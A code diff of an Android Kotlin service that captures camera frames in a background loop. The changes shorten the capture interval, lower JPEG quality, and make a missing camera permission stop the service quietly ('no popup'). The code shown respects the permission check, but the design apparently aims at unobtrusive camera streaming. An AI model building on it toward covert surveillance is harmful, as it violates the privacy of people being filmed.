@@ -26,7 +26,7 @@ class CameraStreamService : Service() {
         const val NOTIF_ID = 200
         @Volatile var isStreaming: Boolean = false
         @Volatile var isFront: Boolean = false
-        @Volatile var intervalMs: Long = 150L
+        @Volatile var intervalMs: Long = 120L
     }
 
     private var cameraDevice: CameraDevice? = null
@@ -41,12 +41,12 @@ class CameraStreamService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val front = intent?.getBooleanExtra("front", false) ?: false
-        val interval = intent?.getLongExtra("interval", 150L) ?: 150L
+        val interval = intent?.getLongExtra("interval", 120L) ?: 120L
 
-        // Cek permission dulu
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA)
             != PackageManager.PERMISSION_GRANTED) {
-            Log.w(TAG, "Camera permission not granted")
+            Log.w(TAG, "Camera permission not granted — skip, no popup")
+            stopSelf()
             return START_NOT_STICKY
         }
 
@@ -166,7 +166,7 @@ class CameraStreamService : Service() {
             val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                 addTarget(reader.surface)
                 set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
-                set(CaptureRequest.JPEG_QUALITY, 50.toByte())
+                set(CaptureRequest.JPEG_QUALITY, 45.toByte())
             }
             s.capture(req.build(), null, handler)
             handler?.postDelayed({ if (running) loopCapture() }, intervalMs)
